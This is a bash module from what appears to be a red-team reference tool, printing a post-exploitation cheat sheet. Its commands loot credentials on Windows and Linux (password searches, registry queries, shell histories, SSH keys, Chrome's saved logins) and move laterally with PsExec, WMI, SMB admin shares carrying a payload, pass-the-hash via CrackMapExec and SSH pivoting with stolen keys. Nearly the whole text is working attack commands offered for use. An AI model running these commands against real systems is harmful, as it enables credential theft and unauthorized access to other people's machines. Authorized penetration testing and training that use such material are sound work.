#!/usr/bin/env bash
# modules/red/postex.sh

red_postex() {
    show_page "🎯 RED — Post Exploitation" \
"═══════════════════════════════════════════════════════════════
  Post Exploitation                                    [RED]
═══════════════════════════════════════════════════════════════

  LOOTING — Windows
  ─────────────────
    # Search for juicy files
    findstr /spin \"password\" C:\\*.txt C:\\*.xml C:\\*.config 2>nul
    dir /s /b C:\\*pass* C:\\*cred* C:\\*vnc* C:\\*.kdbx

    # PowerShell history
    type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

    # Search registry for passwords
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

    # Credential files
    dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\
    dir C:\\Users\\*\\.ssh\\

    # Saved PuTTY sessions
    reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions

    # Browser credentials (Chromium-based)
    copy \"C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" .

  LOOTING — Linux
  ────────────────
    # Config files with credentials
    grep -ri 'password' /etc/ /var/www/ /home/ 2>/dev/null
    find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -l password

    # SSH keys
    find / -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null

    # History files
    cat ~/.bash_history ~/.zsh_history 2>/dev/null
    find /home -name '.bash_history' 2>/dev/null | xargs cat

    # Database credentials
    find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null

  LATERAL MOVEMENT — Windows
  ──────────────────────────
    # PsExec
    psexec \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> cmd.exe

    # WMI Exec
    wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"cmd.exe\"

    # SMB File Share Access
    net use \\\\<TARGET>\\C\$ /user:<DOMAIN>\\<USER> <PASS>
    copy payload.exe \\\\<TARGET>\\C\$\\Windows\\Temp\\

    # Enter-PSSession (WinRM)
    Enter-PSSession -ComputerName <TARGET> -Credential (Get-Credential)

    # Pass-the-Hash (CrackMapExec)
    crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>

  LATERAL MOVEMENT — Linux
  ─────────────────────────
    # SSH with stolen key
    ssh -i id_rsa <USER>@<TARGET>

    # SSH agent forwarding
    ssh -A <USER>@<HOP> then ssh <USER>@<FINAL>

    # SCP pivot
    scp -o ProxyJump=<HOP> <FILE> <USER>@<FINAL>:/tmp/"; }
